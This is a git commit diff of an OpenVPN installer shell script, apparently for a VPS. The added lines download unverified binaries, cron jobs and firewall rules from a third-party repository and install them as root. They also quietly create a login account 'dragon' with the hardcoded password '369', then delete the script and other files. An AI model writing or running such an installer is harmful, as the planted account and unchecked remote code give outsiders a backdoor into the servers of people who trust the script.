5806701c6db8f4ba46c4adc041575bb32de10b06
10p26r <31011752+10p26r@users.noreply.github.com>
2017-09-18 14:09:32 +0700

    Update Install.sh

--- Extra/Install.sh
+++ Extra/Install.sh
@@ -61,9 +61,24 @@ cd
 
 
 # OPENVPN
-wget https://gist.githubusercontent.com/windows98SE/d87fac3540d6e8657013/raw/c80298b1ecb4ecb5250835a30281dfdafd17ff5e/openvpn-install.sh
-chmod +x openvpn-install.sh
-./openvpn-install.sh
+apt-get -y install openvpn
+cd /etc/openvpn/
+wget https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/iptables.up.rules"
+sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
+sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+iptables-restore < /etc/iptables.up.rules
+# etc
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/client.ovpn"
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+cd;wget https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/cronjob.tar
+tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash dragon
+echo "dragon:369" | chpasswd
+echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
+rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 
 # restart service
 service ssh restart
